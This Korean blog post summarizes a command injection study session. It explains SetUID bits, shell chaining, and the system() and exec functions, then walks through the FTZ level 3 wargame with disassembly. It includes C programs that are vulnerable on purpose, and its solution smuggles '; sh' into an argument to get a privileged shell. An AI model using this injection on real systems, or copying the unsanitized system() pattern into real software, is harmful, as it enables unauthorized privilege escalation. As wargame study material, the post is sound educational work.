---
layout: post
title:  "Command Injection 요약"
description: "간단한 실습 정리, system command injection"
date:   2017-05-07
tag: [study, command injection, system]
comments: true
share: true
---

실습 기간 : 2017.05.05 ~ 2017.05.07  
실습 환경 : kali linux, FTZ



Content
---


1. Command Injection 기법이란?   
1.1. Command Injection 정의	   
1.2. SetUID, SetGID, Sticky Bit	   
1.3. Code Injection	  

2. Command Injection 관련 취약 함수	  
2.1. System()	   
2.2. exec 계열 함수	   
2.3. fork()	   

3. Command Injection 실습	   
3.1. FTZ level 3	   



Command Injection 기법이란?
---

### 1.1 Command Injection 정의
- Command Injection이란 목표가 취약한 응용 프로그램을 통해 호스트 운영체제에서 임의의 명령을 실행하는 공격으로 주로 웹 어플리케이션이 많이 발전하지 못했던 시절에 특정 데이터를 처리하기 위해서 시스템 명령어를 웹 어플리케이션에서 호출하여 사용하던 것으로 인해서 자주 발생하였다.  
- 응용프로그램이 안전하지 않은 사용자 제공 데이터 ( 양식, 쿠키, HTTP 헤더 등 )를 시스템 쉘에 전달할 때 가능하며 이를 통해서 악성 스크립트나 파일 등을 업로드하여 공격을 하게 된다.  
- system, execv, ececle, ececve, ececvp, popen, open, fork 등의 함수에서 사용하며 최근에는 Java ASP, PHP, Nodejs등의 어플리케이션에서 이전의 시스템 명령어를 호출하여 처리하였던 파일, 디렉터리 핸들링이나 타 어플리케이션 호출 등의 기능을 구현하고 있기 때문에 많이 줄어들게 되었다.  

### 1.2 SetUID, SetGID, Sticky Bit

```
    chmod 1755 stickybit.txt     // -rwxr-xr-t
    chmod 2755 setgid.txt        // -rwxr-sr-x
    chmod 4755 setuid.txt        // -rwsr-xr-x
              [ ex - 권한 설정 ]
```

- SetUID, SetGID는 파일에 다른 계정이나 그룹의 권한을 임시로 부여하는 개념으로 최신의 리눅스 커널버전에서는 system과 같은 쉘을 실행하는 함수를 실행하기 위해서 알맞은 권한을 획득할 필요가 있다. ( 낮은 수준의 운영체제에서는 자동으로 권한 획득 )  
- ex) SUID가 설정된 파일을 실행하는 동안 일시적으로 파일 소유자의 권한을 가진다.  
- sticky bit를 설정하면 해당 디렉토리에 다른 계정에서 설정한 rwx 권한이 생겨 공용 디렉토리로 활용 가능하다. 하지만 sticky bit가 설정된 디렉토리의 소유자 계정이 아닌 계정은 해당 디렉토리 수정 삭제 불가능하다.  
- ex) user1이 –rwxr-xr-xt 다음과 같은 권한의 tmp 폴더를 생성하였다면 user2가 접속하여 해당 tmp 폴더에서 읽기, 실행 권한를 수행할 수 있다.  


### 1.3 Code Injection
- 유효하지 않은 데이터를 삽입하여 실행하기 위한 기법으로 command 사이를 연결하여 악의적인 명령어를 삽입하는데 사용한다.  
- 명령어 치환( Command Substitution )
­  한 명령어의 출력을 다른 문맥으로 연결하는 기능을 수행한다.

```
­     ` ` : back quote ( back tick )
­     $( ) : dollar
­     ex) command1 `command2` : 2의 실행 결과를 1의 인자로 넘김

     command1; command2; command3 ...
     => 터미널에서 다수의 명령어를 각각 실행
     command1 && command2 && command3 ...
     => 다수의 명령어를 실행, 앞선 명령어가 성공적으로 실행되어야 다음 명령어
        실행 가능
     command1 || command2 || command3 ...
     => 다수의 명령어 중 하나라도 성공하면 다음 명령어 수행 X
            [ ex - code injection ( ;, &&, || ) ]
```



Command Injection 관련 취약 함수 분석
---
### 2.1. System()

```
     #include <stdlib.h>
     int system(const char *string)
        [ ex - system 함수 원형 ]
```

- /bin/sh -c string 형태로 호출하는 함수로 string에 지정된 명령어를 실행하고 명령어가 끝난 후 반환  
- 명령어가 실행되는 동안, SIGCHLD는 블럭되며 SIGINT, SIGQUIT는 무시됨  
- 반환값   
­  execve() 호출 실패 : 127  
­  기타 에러 : -1  
­  성공 시 0이 아닌 값, 실패시 0  
- System()에서 사용되는 signal  
­ SIGCHLD : 작업 제어 시그널, 자식 프로세스들 중 하나라도 종료되거나 멈출 때마다 부모 프로세스에게 보내어짐  
­ SIGINT : 종료 시그널, 사용자가 INTR( ctrl + c ) 문자를 입력했을 때 보내어짐  
­ SIGOUIT : 종료 시그널, QUIT문자를 의미, 코어 파일을 작성   

```
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    void main( char* argc, char** argv ) {
            char cmd[60] = "/bin/ls ";
            strcat(cmd, argv[1]);
            system(cmd);
    }
    [ ex - soruce code – command_injection.c ]

    ­ - SetUID 설정 chmod 4755 command_injection.c
    ­ - 검증 되지 않은 입력( Untrusted Input )
```

### 2.2. exec 계열 함수

```
    #include <unistd.h>
    int execv  ( const char *path, char *const argv[]);
    int execve ( const char *path, char *const argv[], char *const envp);
    int execlp ( const char *file, const char *arg0, ... , const char *argn, (char *)0);
    int execvp ( const char *file, char *const argv[]);
    int execl  ( const char *path, const char *arg0, ... , const char *argn, (char *)0);
    int execle ( const char path, const char *arg0, ... , const char *argn, (char *)0,
                 char *const envp[]);
                        [ ex - exec 계열 함수 원형 ]
```

- exec 계열 함수들은 현재의 프로세스 이미지를 새로운 프로세스 이미지로 덮어쓴다.  
- exec를 호출할 하게 되면 현재 메모리에 상주하고 있는 이후 프로그램은 무시 됨  
- 새로운 프로세스의 이미지는 실행 파일을 실행해서 얻음  
- 이들 함수는 공통적으로 실행할 파일의 경로 정보를 가짐  
  함수 별 요약  
  - execv( )  
    - path에 지정한 경로명에 있는 파일 실행하며 argv를 인자로 전달  
    - argv는 포인터 배열로 마지막에 NULL 문자열을 저장  
  - execve( )  
    - execv() 함수와 동일하게 동작하며 추가로 envp 포인터 배열을 인자로 전달  
  - execlp( )  
    - file에 지정한 파일을 실행하며 arg0 ~ argn만 인자로 전달  
    - 파일은 함수를 호출한 프로세스의 검색 경로(환경 변수 PATH에 정의된 경로)에서 탐색  
    - 함수의 마지막 인자에 NULL 포인터로 지정  
  - execvp( )  
    - file에 지정한 파일 실행, argv를 인자로 전달  
    - 배열의 마지막 인자 NULL 문자열 저장해야 됨  
  - execl( )   
    - path에 지정한 경로명의 파일을 실행하며 arg0 ~ argn을 인자로 전달  
    - 일반적으로 arg0 위치에 실행 파일 명 저장  
    - 함수의 마지막 인자로 인자의 끝을 의미하는 NULL 포인터((char*)0)을 지정
  - execle( )  
    - envp 인자 전달하는 것을 제외하고 execl()과 동일하게 실행 및 인자 전달 수행    
    - envp는 포인터 배열로 마지막에 NULL 문자를 저장, 새로운 환경 변수 설정 가능  


```
    #include <unistd.h>
    int main() {  
         execl("/bin/sh", "/bin/sh", NULL);
    }
             [ ex - execl 함수 ]
```

```
    #include <unistd.h>
    #include <string.h>
    int main(int argc, char **argv)  {
         char *env[]={"MYHOME=seoul", "MYTEST=1234", (char *)0};
         execle("/bin/sh", "sh", NULL, env);
         perror();
    }
                [ ex - execle 함수 ]
```

### 2.3. fork()   

```
    #include <sys/types.h>
    #include <unistd.h>
    pid_t fork(void)
    [ ex – fork 함수 원형 ]
```

- 자식 프로세스를 만들기 위해서 사용되는 프로세스 생성기
- fork에 의해서 생성된 자식 프로세스는 자신만의 PID를 가짐, PPID는 부모의 PID를 가짐
- PGID, SID를 상속받으며, 파일지시자, 시그널 등을 상속 받음
- 단 파일 잠금(lock)과 시그널 팬딩은 상속받지 않음
- pid_t 구조형은 sys/types.h에 속해있고 fork 함수는 unistd에 속함


### 2.4. 기타 언어의 함수들

취약한 함수 구분
- Java( Servlet, JSP )  
  - System.* ( 특히 System.Runtime )  
- Perl   
  - open(), sysopen(), system(), glob()  
- PHP  
  - exec(), system(), passthru(), popen(), require(), include(), eval(), preg_replace()  



Command Injection 실습
---

### 3.1. FTZ level 3

source code
```
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    int main(int argc, char **argv){
        char cmd[100];
        if( argc!=2 ){
            printf( "Auto Digger Version 0.9\n" );
            printf( "Usage : %s host\n", argv[0] );
            exit(0);
        }
        strcpy( cmd, "dig @" );
        strcat( cmd, argv[1] );
        strcat( cmd, " version.bind chaos txt");
        system( cmd );
    }
    ```

    분석
    ```
    # 공격 대상 파일 찾기
         1. 파일명
              find / -name autodig 2> /dev/null
              / 경로를 기준으로 이름이 autodig인 파일을 탐색,
              2> (오류메세지)를 /dev/null 로 보내어 오류메세지 안보이게 함
         2. 파일 권한
              find / -perm +6000 -user level4 2> /dev/null
    # 공격 대상 파일의 기능 분석
    # 리버싱을 통한 의사 코드 복원
    0x08048430 <main+0>:    push   %ebp
    0x08048431 <main+1>:    mov    %esp,%ebp
         - 스택 구성
         - ebp 주소를 저장하고 현재의 esp를 ebp에 저장
    0x08048433 <main+3>:    sub    $0x78,%esp
         - 변수 선언 공간 확보
    0x08048436 <main+6>:    and    $0xfffffff0,%esp
    0x08048439 <main+9>:    mov    $0x0,%eax
    0x0804843e <main+14>:   sub    %eax,%esp
    0x08048440 <main+16>:   cmpl   $0x2,0x8(%ebp)
    0x08048444 <main+20>:   je     0x8048475 <main+69>
         - 조건문 EBP+8의 위치에 값이 0x2인지 비교
         - 참일 경우 0x8048475 <main+69>로 이동
    인자값이 2가 아닐 경우 수행
    0x08048446 <main+22>:   sub    $0xc,%esp
    0x08048449 <main+25>:   push   $0x8048588
    0x0804844e <main+30>:   call   0x8048340 <printf>
    0x08048453 <main+35>:   add    $0x10,%esp
    0x08048456 <main+38>:   sub    $0x8,%esp
    0x08048459 <main+41>:   mov    0xc(%ebp),%eax
    0x0804845c <main+44>:   pushl  (%eax)
    0x0804845e <main+46>:   push   $0x80485a1
    0x08048463 <main+51>:   call   0x8048340 <printf>
    0x08048468 <main+56>:   add    $0x10,%esp
    0x0804846b <main+59>:   sub    $0xc,%esp
    0x0804846e <main+62>:   push   $0x0
    0x08048470 <main+64>:   call   0x8048360 <exit>
    인자값이 2일경우 수행 구문
    0x08048475 <main+69>:   sub    $0x8,%esp
    0x08048478 <main+72>:   push   $0x80485b2
         - 0x80485b2 <_IO_stdin_used+46>:    " dig @"
    0x0804847d <main+77>:   lea    0xffffff88(%ebp),%eax
    0x08048480 <main+80>:   push   %eax
    0x08048481 <main+81>:   call   0x8048370 <strcpy>
         - strcpy의 인자로 스택에 push된 %eax, dig @ 사용
    0x08048486 <main+86>:   add    $0x10,%esp
    0x08048489 <main+89>:   sub    $0x8,%esp
    0x0804848c <main+92>:   mov    0xc(%ebp),%eax
    0x0804848f <main+95>:   add    $0x4,%eax
    0x08048492 <main+98>:   pushl  (%eax)
         - 입력받은 아이피 주소
    0x08048494 <main+100>:  lea    0xffffff88(%ebp),%eax
    0x08048497 <main+103>:  push   %eax
    0x08048498 <main+104>:  call   0x8048330 <strcat>
         - dig @ 와 아이피 주소 문자열 합침
    0x0804849d <main+109>:  add    $0x10,%esp
    0x080484a0 <main+112>:  sub    $0x8,%esp
    0x080484a3 <main+115>:  push   $0x80485b8
         - 0x80485b8 <_IO_stdin_used+52>:   " version.bind chaos txt"
    0x080484a8 <main+120>:  lea    0xffffff88(%ebp),%eax
    0x080484ab <main+123>:  push   %eax
    0x080484ac <main+124>:  call   0x8048330 <strcat>
         - push 된 두인자의 문자열 합침
    0x080484b1 <main+129>:  add    $0x10,%esp
    0x080484b4 <main+132>:  sub    $0x8,%esp
    0x080484b7 <main+135>:  push   $0xbbc
    0x080484bc <main+140>:  push   $0xbbc
         - 3004
    0x080484c1 <main+145>:  call   0x8048350 <setreuid>
         - setreuid : 현재 프로세스의 유효한 사용자 ID 설정
         - 인자 : ruid, euid
    0x080484c6 <main+150>:  add    $0x10,%esp
    0x080484c9 <main+153>:  sub    $0xc,%esp
    0x080484cc <main+156>:  lea    0xffffff88(%ebp),%eax
    0x080484cf <main+159>:  push   %eax
    0x080484d0 <main+160>:  call   0x8048310 <system>
         - 시스템 함수 실행
    0x080484d5 <main+165>:  add    $0x10,%esp
    0x080484d8 <main+168>:  leave
    0x080484d9 <main+169>:  ret
    0x080484da <main+170>:  nop
    0x080484db <main+171>:  nop
```

공격

 - 문자열이 2개이상 입력 되면 안됨  
 - " " 를 사용하여 하나의 문자열로 전송   
 - 유닉스 계열에서 연속적인 명령어 전달을 하기 위해서 ; 사용   
 - /bin/autodig "127.0.0.1; sh"  


  

참고문헌
---

[1] 문제풀이로 배우는 시스템 해킹 테크닉, 여동기 저, 위키북스  

[2] Command Injection  
    <https://bpsecblog.wordpress.com/2016/10/05/command_injection_02/>

[3] Command Injection 정의  
    <https://www.owasp.org/index.php/Command_Injection>
